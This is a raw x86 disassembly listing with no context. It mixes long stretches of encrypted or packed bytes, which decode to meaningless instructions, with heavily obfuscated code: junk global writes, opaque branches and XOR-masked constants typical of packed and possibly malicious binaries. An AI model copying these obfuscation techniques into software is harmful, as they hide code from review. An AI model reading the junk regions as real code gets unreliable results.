  420c8c:	das    
  420c8d:	sahf   
  420c8e:	jb     0x420c73
  420c90:	sub    esi,DWORD PTR [eax-0x77]
  420c93:	in     al,dx
  420c94:	xchg   esp,eax
  420c95:	inc    edx
  420c96:	mov    ds:0x8299043e,al
  420c9b:	scas   eax,DWORD PTR es:[edi]
  420c9c:	adc    eax,0x93276475
  420ca1:	(bad)  
  420ca2:	pop    ecx
  420ca3:	or     dl,BYTE PTR [ebx-0x4b]
  420ca6:	scas   eax,DWORD PTR es:[edi]
  420ca7:	aam    0x5e
  420ca9:	adc    DWORD PTR [eax+0x5ff6b40],ebp
  420caf:	mov    ds:0x50181249,al
  420cb4:	xchg   ebp,eax
  420cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cb6:	or     eax,0x7785080e
  420cbb:	inc    ecx
  420cbc:	inc    edi
  420cbd:	shr    cl,0x59
  420cc0:	mov    eax,0x462628b2
  420cc5:	cwde   
  420cc6:	adc    dh,BYTE PTR [edi-0xce3c22c]
  420ccc:	mov    ah,0x63
  420cce:	lea    ebp,[ecx-0x180fbae3]
  420cd4:	mov    dh,0xab
  420cd6:	js     0x420d10
  420cd8:	inc    ebx
  420cd9:	shl    DWORD PTR [esi-0x19],cl
  420cdc:	xchg   ebx,eax
  420cdd:	xchg   ebx,eax
  420cde:	and    DWORD PTR [ecx+0x8f6d6ee],eax
  420ce4:	xchg   BYTE PTR [ecx+0x7b],dh
  420ce7:	pop    ebx
  420ce8:	pop    ss
  420ce9:	sbb    DWORD PTR [ecx-0x19],0xfffffffb
  420ced:	cld    
  420cee:	sbb    esp,edx
  420cf0:	sub    eax,0x7acf207f
  420cf5:	jb     0x420cd4
  420cf7:	mov    dh,0x25
  420cf9:	das    
  420cfa:	arpl   WORD PTR [eax],bp
  420cfc:	adc    cl,BYTE PTR [edi-0x1df64817]
  420d02:	enter  0x6e59,0x13
  420d06:	addr16 mov cl,0xe0
  420d09:	imul   ebp,DWORD PTR [ebx+0x2531ae60],0xffffffcc
  420d10:	jg     0x420cde
  420d12:	lock nop
  420d14:	enter  0x8ac6,0xc2
  420d18:	jmp    0x420cca
  420d1a:	cmp    ch,bh
  420d1c:	inc    edx
  420d1d:	push   esp
  420d1e:	mov    edx,0xb7120494
  420d23:	mov    ds:0xcfaec155,eax
  420d28:	lahf   
  420d29:	out    0xc7,al
  420d2b:	js     0x420ccb
  420d2d:	into   
  420d2e:	and    eax,0xdeea92
  420d33:	sub    bl,BYTE PTR [ecx+0x41]
  420d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d37:	(bad)  
  420d38:	dec    edx
  420d39:	xchg   ecx,eax
  420d3a:	sbb    eax,0xae7aeb79
  420d3f:	xchg   edi,eax
  420d40:	sbb    BYTE PTR [edi],cl
  420d42:	add    esp,DWORD PTR [esi+0x36]
  420d45:	push   eax
  420d46:	adc    bl,BYTE PTR [eax]
  420d48:	jl     0x420cdb
  420d4a:	int    0x6
  420d4c:	fsubr  DWORD PTR [ebx+ecx*8+0x36d63c0f]
  420d53:	aam    0x72
  420d55:	dec    edi
  420d56:	jnp    0x420d94
  420d58:	pop    ds
  420d59:	out    0xf0,al
  420d5b:	mov    bh,0xe0
  420d5d:	cmp    BYTE PTR [eax-0x306f26e7],dh
  420d63:	das    
  420d64:	mov    edi,0x77eda4a4
  420d69:	mov    bl,0x74
  420d6b:	dec    ecx
  420d6c:	push   edx
  420d6d:	rcr    ah,0x67
  420d70:	(bad)  
  420d71:	mov    esp,0xe908cb67
  420d76:	test   DWORD PTR [eax],eax
  420d78:	push   0xfffffff0
  420d7a:	aad    0x42
  420d7c:	jns    0x420d45
  420d7e:	ret    0x7bae
  420d81:	mov    ch,BYTE PTR [esi+0x3b]
  420d84:	test   BYTE PTR [edx+0x5678a15f],bh
  420d8a:	dec    edi
  420d8b:	sahf   
  420d8c:	lds    esp,FWORD PTR [esi+0x7f0b401d]
  420d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d93:	adc    BYTE PTR [edi+0x3b],0xf0
  420d97:	ror    eax,cl
  420d99:	mov    WORD PTR [ecx+0x7c8d184c],ss
  420d9f:	xchg   dl,bh
  420da1:	into   
  420da2:	xchg   ebp,eax
  420da3:	pop    ecx
  420da4:	fild   QWORD PTR ds:0xa450ef02
  420daa:	cmp    DWORD PTR [ebp+0x4775fd3],esi
  420db0:	cmp    eax,ebp
  420db2:	lods   al,BYTE PTR ds:[esi]
  420db3:	mov    dh,0xad
  420db5:	data16 cmc 
  420db7:	out    dx,al
  420db8:	sbb    DWORD PTR [eax],eax
  420dba:	push   cs
  420dbb:	mov    eax,ds:0xe480b422
  420dc0:	add    al,0x71
  420dc2:	sbb    al,0xce
  420dc4:	jno    0x420e11
  420dc6:	test   eax,0x48c2ff42
  420dcb:	cmp    ah,cl
  420dcd:	in     al,dx
  420dce:	data16 jge 0x420e20
  420dd1:	cmp    BYTE PTR [ebx+0x2e],al
  420dd4:	pop    ecx
  420dd5:	rcr    esi,0xfa
  420dd8:	test   al,0xa0
  420dda:	ret    
  420ddb:	into   
  420ddc:	shl    DWORD PTR [edx],1
  420dde:	fwait
  420ddf:	jg     0x420e56
  420de1:	outs   dx,DWORD PTR ds:[esi]
  420de2:	sar    BYTE PTR [edi+0x1],1
  420de5:	lahf   
  420de6:	and    eax,0x615614a8
  420deb:	xchg   esi,eax
  420dec:	sub    DWORD PTR [edx+0x12e07917],eax
  420df2:	gs cmc 
  420df4:	jnp    0x420e17
  420df6:	retf   0x4155
  420df9:	int    0xea
  420dfb:	test   DWORD PTR [eax-0x78d24c1f],eax
  420e01:	jno    0x420dd0
  420e03:	add    eax,0xb39f50ee
  420e08:	xor    al,0xd0
  420e0a:	add    ah,BYTE PTR [edx+0x3c]
  420e0d:	mov    eax,ds:0x5a9e9e0
  420e12:	adc    BYTE PTR [ecx],ch
  420e14:	(bad)  
  420e15:	out    0x43,eax
  420e17:	and    BYTE PTR [ebx],0x3e
  420e1a:	js     0x420ddf
  420e1c:	mov    BYTE PTR [eax],0x5b
  420e1f:	pop    DWORD PTR [ecx]
  420e21:	retf   0x6741
  420e24:	sahf   
  420e25:	jbe    0x420e91
  420e27:	int    0x57
  420e29:	aaa    
  420e2a:	jge    0x420e3a
  420e2c:	mov    al,ds:0xd1b39aaf
  420e31:	sti    
  420e32:	out    dx,eax
  420e33:	stc    
  420e34:	dec    edi
  420e35:	sbb    al,0xbd
  420e37:	jl     0x420de9
  420e39:	(bad)  
  420e3b:	jae    0x420ea1
  420e3d:	sub    DWORD PTR [ebp+0x55d3f921],0xaca4ea7f
  420e47:	inc    ebp
  420e48:	mov    ds:0xc1e93821,eax
  420e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e4e:	dec    ebx
  420e4f:	add    BYTE PTR [ecx+edx*4-0x76cf59fd],0xaf
  420e57:	rol    DWORD PTR [ecx+0x29adea],0x0
  420e5e:	mov    esi,DWORD PTR ds:0x42814b
  420e64:	sbb    DWORD PTR ds:0x42833f,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x42835b,0x0
  420e74:	mov    DWORD PTR ds:0x428213,ebx
  420e7a:	mov    DWORD PTR ds:0x42814b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42813f
  420e8e:	mov    DWORD PTR ds:0x428223,0x776f
  420e98:	cmp    DWORD PTR ds:0x42835b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x4281f7
  420eaa:	push   0x42805f
  420eaf:	call   DWORD PTR ds:0x428e18
  420eb5:	add    ecx,DWORD PTR ds:0x428357
  420ebb:	xor    esi,DWORD PTR ds:0x4281ef
  420ec1:	adc    DWORD PTR ds:0x428247,edx
  420ec7:	xor    DWORD PTR ds:0x4282cf,edx
  420ecd:	mov    esi,DWORD PTR ds:0x4281fb
  420ed3:	or     esi,DWORD PTR ds:0x428157
  420ed9:	mov    DWORD PTR ds:0x4281fb,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42822f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428117
  420eef:	sbb    eax,DWORD PTR ds:0x4282cb
  420ef5:	mov    ds:0x428117,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x4281c7
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42831f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x4282cf,0x0
  420f23:	mov    DWORD PTR ds:0x428263,0x1362
  420f2d:	mov    DWORD PTR ds:0x428213,edx
  420f33:	mov    DWORD PTR ds:0x42824f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428333,0xeb5
  420f48:	cmp    DWORD PTR ds:0x4282cf,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428e90
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42819f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281ab
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428227,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42821f
  420f87:	sbb    edx,DWORD PTR ds:0x428367
  420f8d:	mov    DWORD PTR ds:0x42821f,edx
  420f93:	add    DWORD PTR ds:0x42815b,ecx
  420f99:	sub    DWORD PTR ds:0x42834b,0x4282bb
  420fa3:	cmp    DWORD PTR ds:0x428247,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42832b
  420fb0:	movzx  edx,BYTE PTR ds:0x428133
  420fb7:	mov    DWORD PTR ds:0x4282b7,0x5580
  420fc1:	mov    DWORD PTR ds:0x428363,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428367,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428247,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d34
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x4282c7
  421000:	sbb    DWORD PTR ds:0x428243,edx
  421006:	movzx  edx,WORD PTR ds:0x42811b
  42100d:	or     edx,DWORD PTR ds:0x428343
  421013:	mov    DWORD PTR ds:0x42811b,edx
  421019:	dec    DWORD PTR ds:0x428333
  42101f:	sub    DWORD PTR ds:0x42823f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42812b,0x0
  421048:	mov    DWORD PTR ds:0x428337,0x62d9
  421052:	mov    DWORD PTR ds:0x428117,0x300d
  42105c:	mov    DWORD PTR ds:0x42811b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282bf
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42832f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42812b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d54
  4210a1:	sbb    ecx,DWORD PTR ds:0x428243
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428267,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428123
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x4221fc
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x42133f
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xabc:0x65828d2a
  42115b:	lods   eax,DWORD PTR ds:[esi]
  42115c:	jge    0x42110e
  42115e:	ror    DWORD PTR [edi],0x16
  421161:	sbb    BYTE PTR [esi+0x16],ch
  421164:	sbb    BYTE PTR [eax],bl
  421166:	mov    eax,0x7c2f9d8d
  42116b:	xor    ebx,0x31
  42116e:	ss loopne 0x4211ce
  421171:	jmp    0x28fc34b2
  421176:	arpl   cx,di
  421178:	inc    edi
  421179:	mov    dl,0x3e
  42117b:	inc    esi
  42117c:	psubw  mm1,QWORD PTR [ebx]
  42117f:	retf   0xcc44
  421182:	sub    eax,0x8cfa63a2
  421187:	inc    eax
  421188:	add    ecx,ebx
  42118a:	pop    ebp
  42118b:	mov    ecx,0xf5e58797
  421190:	loop   0x4211d8
  421192:	imul   esi,eax,0x416c2612
  421198:	mov    ch,0x1d
  42119a:	dec    ecx
  42119b:	shl    DWORD PTR [edi+0x59],0x9
  42119f:	(bad)  
  4211a0:	ror    BYTE PTR [ebx],cl
  4211a2:	hlt    
  4211a3:	lods   al,BYTE PTR ds:[esi]
  4211a4:	fwait
  4211a5:	addr16 ss push ebp
  4211a8:	jmp    0xe6e1b082
  4211ad:	xlat   BYTE PTR gs:[ebx]
  4211af:	out    0x97,al
  4211b1:	dec    edx
  4211b2:	xchg   edx,eax
  4211b3:	mov    dh,0x85
  4211b5:	add    eax,0x1b09c0d9
  4211ba:	stos   DWORD PTR es:[edi],eax
  4211bb:	xor    ch,BYTE PTR [ebx+0x1c]
  4211be:	xchg   ecx,eax
  4211bf:	gs (bad) 
  4211c2:	mov    ebx,0x71768074
  4211c7:	out    0x41,eax
  4211c9:	and    eax,edx
  4211cb:	int3   
  4211cc:	data16 jle 0x4211b2
  4211cf:	rcl    BYTE PTR ds:0xfb12bd13,cl
  4211d5:	icebp  
  4211d6:	dec    esp
  4211d7:	outs   dx,BYTE PTR ds:[esi]
  4211d8:	adc    al,BYTE PTR [esi-0x45]
  4211db:	pushf  
  4211dc:	ret    0x772
  4211df:	in     eax,dx
  4211e0:	mov    ebp,0x4ab524e7
  4211e5:	iret   
  4211e6:	mov    dh,ah
  4211e8:	shl    DWORD PTR [edi],cl
  4211ea:	mov    edx,0x45cb23b7
  4211ef:	adc    bh,BYTE PTR [ebx-0x6a]
  4211f2:	lahf   
  4211f3:	mov    esp,DWORD PTR [eax+0x6b]
  4211f6:	add    DWORD PTR [edx-0x69],0x39
  4211fa:	cmc    
  4211fb:	sub    DWORD PTR [eax+ebx*1+0x7b193b38],edx
  421202:	das    
  421203:	sub    bh,BYTE PTR [ecx-0x6f7b06b4]
  421209:	fwait
  42120a:	int    0x5e
  42120c:	loop   0x421192
  42120e:	fldenv [ebp+ecx*8-0x7b]
  421212:	mov    ebp,0xd592de2b
  421217:	(bad)  
  421218:	sbb    eax,DWORD PTR [ebx-0x29]
  42121b:	push   edi
  42121c:	nop
  42121d:	je     0x4211c5
  42121f:	cmp    ch,BYTE PTR [edi]
  421221:	and    ah,ah
  421223:	aad    0xfe
  421225:	in     al,0x99
  421227:	and    DWORD PTR [ebp+ebx*4+0x72],0xb0b4b303
  42122f:	ficom  DWORD PTR [eax+edx*2+0x6689c2c7]
  421236:	dec    edx
  421237:	cmp    eax,0x1186a0cc
  42123c:	out    0x8d,eax
  42123e:	jmp    0xdcd6:0xde565507
  421245:	(bad)  
  421246:	adc    BYTE PTR [ebx-0x50b8a0ff],bl
  42124c:	sbb    eax,0xfca399fb
  421251:	jg     0x421211
  421253:	jle    0x421253
  421255:	int    0xfd
  421257:	inc    ebp
  421258:	dec    esi
  421259:	int3   
  42125a:	or     BYTE PTR [ecx+eax*2+0x61],0xb3
  42125f:	mov    ebx,0x34088346
  421264:	mov    ds:0x2b652f98,eax
  421269:	shr    DWORD PTR [ebx],cl
  42126b:	and    DWORD PTR [edi],ebp
  42126d:	xchg   esp,eax
  42126e:	fs or  eax,0x21529258
  421274:	mov    ch,0x81
  421276:	hlt    
  421277:	imul   edx,edi,0x5e32f309
  42127d:	adc    dl,BYTE PTR [ebx-0x7fb5a214]
  421283:	loope  0x4212a5
  421285:	test   al,0x96
  421287:	std    
  421288:	xchg   edx,eax
  421289:	or     BYTE PTR [ebx+edi*4],ah
  42128c:	sub    DWORD PTR [esi+ebx*2],eax
  42128f:	neg    BYTE PTR [esi-0x9]
  421292:	ins    DWORD PTR es:[edi],dx
  421293:	es sti 
  421295:	pop    edi
  421296:	clc    
  421297:	fdiv   DWORD PTR [esi+0x4fe26c61]
  42129d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42129e:	dec    eax
  42129f:	dec    esp
  4212a0:	pop    ss
  4212a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a2:	out    dx,eax
  4212a3:	mov    al,ds:0x291186f6
  4212a8:	into   
  4212a9:	xchg   ebp,eax
  4212aa:	mov    ds:0x9cd312cb,al
  4212af:	aam    0x63
  4212b1:	mov    cl,0x16
  4212b3:	sar    BYTE PTR [edi-0x11],1
  4212b6:	cmp    DWORD PTR [ebx+0x57],ebp
  4212b9:	xchg   ebx,eax
  4212ba:	push   ebx
  4212bb:	and    al,0x75
  4212bd:	sar    BYTE PTR [ebx-0x39],cl
  4212c0:	mov    dh,0xcc
  4212c2:	or     ebx,esp
  4212c4:	in     al,0x7
  4212c6:	xchg   esp,eax
  4212c7:	aas    
  4212c8:	xchg   ebp,eax
  4212c9:	jge    0x4212bb
  4212cb:	adc    DWORD PTR ds:0xfe759fb3,edi
  4212d1:	push   esi
  4212d2:	in     eax,dx
  4212d3:	jb     0x421318
  4212d5:	(bad)  
  4212d7:	out    0x76,al
  4212d9:	(bad)  
  4212db:	and    al,BYTE PTR [edi+ebx*8+0x7c]
  4212df:	shr    BYTE PTR [edx+0xb716242],1
  4212e5:	es jno 0x42132c
  4212e8:	xor    eax,0x19d34eb3
  4212ed:	pop    ebx
  4212ee:	out    dx,eax
  4212ef:	jb     0x42127f
  4212f1:	mov    ch,0xda
  4212f3:	sub    edx,DWORD PTR [eax]
  4212f5:	mov    cl,0x69
  4212f7:	icebp  
  4212f8:	jnp    0x4212ac
  4212fa:	pop    es
  4212fb:	add    BYTE PTR [ebx+0x13],al
  4212fe:	sahf   
  4212ff:	add    al,BYTE PTR [ebp+0x23f019bb]
  421305:	mov    WORD PTR [edi+0x2b],ds
  421308:	mov    eax,0x7a49c592
  42130d:	jnp    0x42135a
  42130f:	(bad)
  421314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421315:	mov    bl,0x47
  421317:	sar    ebp,0xb6
  42131a:	iret   
  42131b:	loop   0x421301
  42131d:	push   0xa536c49a
  421322:	or     esp,0xfffffff9
  421325:	scas   eax,DWORD PTR es:[edi]
  421326:	add    BYTE PTR [ebx],al
  421328:	mov    al,ds:0xf76d9c54
  42132d:	ret    
  42132e:	fs adc dl,dl
  421331:	dec    bx
  421333:	sub    esi,ebx
  421335:	mov    al,0x78
  421337:	push   DWORD PTR [ecx]
  421339:	scas   eax,DWORD PTR es:[edi]
  42133a:	fistp  WORD PTR [ebp+ebx*2+0x56]
  42133e:	xchg   edx,eax
  42133f:	mov    eax,DWORD PTR [ebp-0x15c]
  421345:	mov    edx,DWORD PTR [ebp-0x158]
  42134b:	xor    eax,0xca79a575
  421350:	xor    edx,0x9c1b89e8
  421356:	mov    cl,0x2
  421358:	call   0x40a9b5
  42135d:	mov    ecx,edx
  42135f:	mov    edx,DWORD PTR [ebp-0x15c]
  421365:	mov    DWORD PTR [ebp-0x218],esi
  42136b:	mov    esi,DWORD PTR [ebp-0x158]
  421371:	xor    edx,0xca79a575
  421377:	xor    esi,0x9c1b89e8
  42137d:	mov    DWORD PTR [ebp-0x21c],eax
  421383:	mov    eax,edx
  421385:	mov    edx,esi
  421387:	mov    DWORD PTR [ebp-0x220],ecx
  42138d:	mov    cl,0x3e
  42138f:	call   0x4221fc
  421394:	mov    esi,DWORD PTR [ebp-0x21c]
  42139a:	or     esi,eax
  42139c:	mov    eax,DWORD PTR [ebp-0x220]
  4213a2:	or     eax,edx
  4213a4:	push   eax
  4213a5:	push   esi
  4213a6:	push   ebx
  4213a7:	push   edi
  4213a8:	call   0x416c20
  4213ad:	mov    esi,DWORD PTR [ebp-0x218]
  4213b3:	cmp    esi,eax
  4213b5:	jne    0x42146b
  4213bb:	mov    eax,DWORD PTR [ebp-0x154]
  4213c1:	mov    edx,DWORD PTR [ebp-0x150]
  4213c7:	xor    eax,0xca79a575
  4213cc:	xor    edx,0x9c1b89e8
  4213d2:	mov    cl,0x2
  4213d4:	call   0x40a9b5
  4213d9:	mov    esi,eax
  4213db:	mov    edi,edx
  4213dd:	mov    eax,DWORD PTR [ebp-0x154]
  4213e3:	mov    edx,DWORD PTR [ebp-0x150]
  4213e9:	xor    eax,0xca79a575
  4213ee:	xor    edx,0x9c1b89e8
  4213f4:	mov    cl,0x3e
  4213f6:	call   0x4221fc
  4213fb:	or     esi,eax
  4213fd:	or     edi,edx
  4213ff:	mov    eax,DWORD PTR [ebp-0x15c]
  421405:	mov    edx,DWORD PTR [ebp-0x158]
  42140b:	xor    eax,0xca79a575
  421410:	xor    edx,0x9c1b89e8
  421416:	mov    cl,0x2
  421418:	call   0x40a9b5
  42141d:	mov    ebx,eax
  42141f:	mov    eax,edx
  421421:	mov    ecx,DWORD PTR [ebp-0x15c]
  421427:	mov    edx,DWORD PTR [ebp-0x158]
  42142d:	xor    ecx,0xca79a575
  421433:	xor    edx,0x9c1b89e8
  421439:	mov    DWORD PTR [ebp-0x224],eax
  42143f:	mov    eax,ecx
  421441:	mov    cl,0x3e
  421443:	call   0x4221fc
  421448:	or     ebx,eax
  42144a:	mov    eax,DWORD PTR [ebp-0x224]
  421450:	or     eax,edx
  421452:	push   eax
  421453:	push   ebx
  421454:	push   edi
  421455:	push   esi
  421456:	call   0x416c20
  42145b:	mov    DWORD PTR [ebp-0x178],eax
  421461:	jmp    0x42172b
  421466:	jmp    0x4216e1
  42146b:	lea    eax,[ebp-0x168]
  421471:	mov    DWORD PTR [ebp-0x164],eax
  421477:	mov    eax,DWORD PTR [ebp-0x164]
  42147d:	mov    DWORD PTR [eax],0xa4069aae
  421483:	mov    eax,DWORD PTR [ebp-0x168]
  421489:	xor    eax,0xa4069aae
  42148e:	shr    eax,0x2
  421491:	mov    ecx,DWORD PTR [ebp-0x168]
  421497:	xor    ecx,0xa4069aae
  42149d:	shl    ecx,0x1e
  4214a0:	or     eax,ecx
  4214a2:	mov    ecx,DWORD PTR [ebp-0x174]
  4214a8:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214ac:	mov    DWORD PTR [ebp-0x160],eax
  4214b2:	mov    esi,DWORD PTR [ebp-0x160]
  4214b8:	mov    eax,DWORD PTR [ebp-0x154]
  4214be:	mov    edx,DWORD PTR [ebp-0x150]
  4214c4:	xor    eax,0xca79a575
  4214c9:	xor    edx,0x9c1b89e8
  4214cf:	mov    cl,0x2
  4214d1:	call   0x40a9b5
  4214d6:	mov    edi,eax
  4214d8:	mov    ebx,edx
  4214da:	mov    eax,DWORD PTR [ebp-0x154]
  4214e0:	mov    edx,DWORD PTR [ebp-0x150]
  4214e6:	xor    eax,0xca79a575
  4214eb:	xor    edx,0x9c1b89e8
  4214f1:	mov    cl,0x3e
  4214f3:	call   0x4221fc
  4214f8:	or     edi,eax
  4214fa:	or     ebx,edx
  4214fc:	mov    eax,DWORD PTR [ebp-0x15c]
  421502:	mov    edx,DWORD PTR [ebp-0x158]
  421508:	xor    eax,0xca79a575
  42150d:	xor    edx,0x9c1b89e8
  421513:	mov    cl,0x2
  421515:	call   0x40a9b5
  42151a:	mov    ecx,edx
  42151c:	mov    edx,DWORD PTR [ebp-0x15c]
  421522:	mov    DWORD PTR [ebp-0x228],esi
  421528:	mov    esi,DWORD PTR [ebp-0x158]
  42152e:	xor    edx,0xca79a575
  421534:	xor    esi,0x9c1b89e8
  42153a:	mov    DWORD PTR [ebp-0x22c],eax
  421540:	mov    eax,edx
  421542:	mov    edx,esi
  421544:	mov    DWORD PTR [ebp-0x230],ecx
  42154a:	mov    cl,0x3e
  42154c:	call   0x4221fc
  421551:	mov    esi,DWORD PTR [ebp-0x22c]
  421557:	or     esi,eax
  421559:	mov    eax,DWORD PTR [ebp-0x230]
  42155f:	or     eax,edx
  421561:	push   eax
  421562:	push   esi
  421563:	push   ebx
  421564:	push   edi
  421565:	call   0x416c20
  42156a:	mov    esi,DWORD PTR [ebp-0x228]
  421570:	cmp    esi,eax
  421572:	je     0x4215e7
  421578:	mov    eax,DWORD PTR [ebp-0x154]
  42157e:	mov    edx,DWORD PTR [ebp-0x150]
  421584:	xor    eax,0xca79a575
  421589:	xor    edx,0x9c1b89e8
  42158f:	mov    cl,0x2
  421591:	call   0x40a9b5
  421596:	mov    esi,eax
  421598:	mov    edi,edx
  42159a:	mov    eax,DWORD PTR [ebp-0x154]
  4215a0:	mov    edx,DWORD PTR [ebp-0x150]
  4215a6:	xor    eax,0xca79a575
  4215ab:	xor    edx,0x9c1b89e8
  4215b1:	mov    cl,0x3e
  4215b3:	call   0x4221fc
  4215b8:	or     esi,eax
  4215ba:	or     edi,edx
  4215bc:	mov    eax,DWORD PTR [ebp-0x160]
  4215c2:	imul   esi,eax
  4215c5:	add    esi,DWORD PTR [ebp-0x170]
  4215cb:	mov    DWORD PTR [ebp-0x16c],esi
  4215d1:	mov    eax,DWORD PTR [ebp-0x16c]
  4215d7:	mov    DWORD PTR [ebp-0x178],eax
  4215dd:	jmp    0x42172b
  4215e2:	jmp    0x421692
  4215e7:	mov    eax,DWORD PTR [ebp-0x154]
  4215ed:	mov    edx,DWORD PTR [ebp-0x150]
  4215f3:	xor    eax,0xca79a575
  4215f8:	xor    edx,0x9c1b89e8
  4215fe:	mov    cl,0x2
  421600:	call   0x40a9b5
  421605:	mov    esi,eax
  421607:	mov    edi,edx
  421609:	mov    eax,DWORD PTR [ebp-0x154]
  42160f:	mov    edx,DWORD PTR [ebp-0x150]
  421615:	xor    eax,0xca79a575
  42161a:	xor    edx,0x9c1b89e8
  421620:	mov    cl,0x3e
  421622:	call   0x4221fc
  421627:	or     esi,eax
  421629:	or     edi,edx
  42162b:	mov    eax,DWORD PTR [ebp-0x15c]
  421631:	mov    edx,DWORD PTR [ebp-0x158]
  421637:	xor    eax,0xca79a575
  42163c:	xor    edx,0x9c1b89e8
  421642:	mov    cl,0x2
  421644:	call   0x40a9b5
  421649:	mov    ebx,eax
  42164b:	mov    eax,edx
  42164d:	mov    ecx,DWORD PTR [ebp-0x15c]
  421653:	mov    edx,DWORD PTR [ebp-0x158]
  421659:	xor    ecx,0xca79a575
  42165f:	xor    edx,0x9c1b89e8
  421665:	mov    DWORD PTR [ebp-0x234],eax
  42166b:	mov    eax,ecx
  42166d:	mov    cl,0x3e
  42166f:	call   0x4221fc
  421674:	or     ebx,eax
  421676:	mov    eax,DWORD PTR [ebp-0x234]
  42167c:	or     eax,edx
  42167e:	push   eax
  42167f:	push   ebx
  421680:	push   edi
  421681:	push   esi
  421682:	call   0x416c20
  421687:	mov    DWORD PTR [ebp-0x178],eax
  42168d:	jmp    0x42172b
  421692:	mov    eax,DWORD PTR [ebp-0x15c]
  421698:	mov    edx,DWORD PTR [ebp-0x158]
  42169e:	xor    eax,0xca79a575
  4216a3:	xor    edx,0x9c1b89e8
  4216a9:	mov    cl,0x2
  4216ab:	call   0x40a9b5
  4216b0:	mov    esi,eax
  4216b2:	mov    edi,edx
  4216b4:	mov    eax,DWORD PTR [ebp-0x15c]
  4216ba:	mov    edx,DWORD PTR [ebp-0x158]
  4216c0:	xor    eax,0xca79a575
  4216c5:	xor    edx,0x9c1b89e8
  4216cb:	mov    cl,0x3e
  4216cd:	call   0x4221fc
  4216d2:	or     esi,eax
  4216d4:	or     edi,edx
  4216d6:	mov    DWORD PTR [ebp-0x178],esi
  4216dc:	jmp    0x42172b
  4216e1:	mov    eax,DWORD PTR [ebp-0x15c]
